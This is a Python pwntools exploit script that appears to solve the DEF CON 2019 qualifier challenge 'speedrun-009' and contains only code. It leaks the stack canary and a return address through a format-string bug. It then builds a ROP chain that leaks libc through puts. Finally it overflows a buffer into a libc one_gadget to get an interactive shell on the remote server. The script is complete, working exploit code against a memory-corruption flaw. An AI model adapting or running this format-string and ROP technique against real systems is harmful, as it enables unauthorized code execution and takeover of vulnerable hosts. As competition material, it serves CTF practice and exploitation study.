from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
r = remote('speedrun-009.quals2019.oooverflow.io', 31337)

rr = lambda x: r.recvuntil(str(x))
ss = lambda x: r.sendline(str(x))
s0 = lambda x: r.send(str(x))
go = lambda x: (rr('3\n'),s0(x))

e = ELF('./speedrun-009')
libc = ELF('./libc.so.6')
libc_puts_offset = libc.symbols['puts']
libc_one_gadget_offset = 0x4f2c5
puts_plt_offset = e.symbols['puts']
puts_got_offset = e.got['puts'] 
main_offset = 0x91c 
#0x0000000000000b23 : pop rdi ; ret
gg1_offset = 0xb23
#0x0000000000000b21 : pop rsi ; pop r15 ; ret
gg2_offset = 0xb21

fsb_offset = 8
canary_offset = fsb_offset+155
ret_offset = canary_offset+2

# stage1: leak canary and ret
go('2')
p = '%' + str(canary_offset) + '$llx' 
p += '\"%' + str(ret_offset) + '$llx!'
s0(p)
[canary, ret] = (rr('!')[:-1]).split('\"')[-2:]

canary = int(canary,16)
ret = int(ret,16)

# set gadgets for pie entry
entry_addr = ret - 0xaac
puts_plt = entry_addr + puts_plt_offset
puts_got = entry_addr + puts_got_offset
main = entry_addr + main_offset
gg1 = entry_addr + gg1_offset
gg2 = entry_addr + gg2_offset

# stage2: leak libc andi go back
go('1')
p = 'a' * (0x410-0x8)
p += p64(canary)
p += 'a' * 8
p += flat(
        gg1,
        puts_got,
        puts_plt,
        main
)
s0(p)
go(3)
libc_puts = u64((rr('\n')[:-1]).ljust(8, '\x00'))
libc_base = libc_puts - libc_puts_offset
libc_one_gadget = libc_base + libc_one_gadget_offset

# stage3: exploit by one-gadget
go('1')
p = 'a' * (0x410-0x8)
p += p64(canary)
p += 'a' * 8
p += p64(libc_one_gadget)
s0(p)

r.interactive()
